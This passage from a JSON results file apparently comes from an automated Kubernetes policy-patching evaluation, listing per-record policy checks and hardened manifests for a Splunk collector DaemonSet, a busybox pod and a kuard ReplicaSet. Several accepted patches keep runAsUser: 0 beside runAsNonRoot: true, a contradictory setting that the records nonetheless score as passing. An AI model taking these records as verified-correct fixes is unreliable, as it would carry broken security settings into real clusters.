name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01494",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": false,
    "patched_yaml": null,
    "errors": []
  },
  {
    "id": "01495",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": false,
    "patched_yaml": null,
    "errors": []
  },
  {
    "id": "01496",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": false,
    "patched_yaml": null,
    "errors": []
  },
  {
    "id": "01497",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01498",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01499",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01500",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox:stable\n    name: failing-pod\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01501",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox:stable\n    name: failing-pod\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01502",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox:stable\n    name: failing-pod\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01503",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox:stable\n    name: failing-pod\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01504",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox:stable\n    name: failing-pod\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01505",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01506",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01507",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
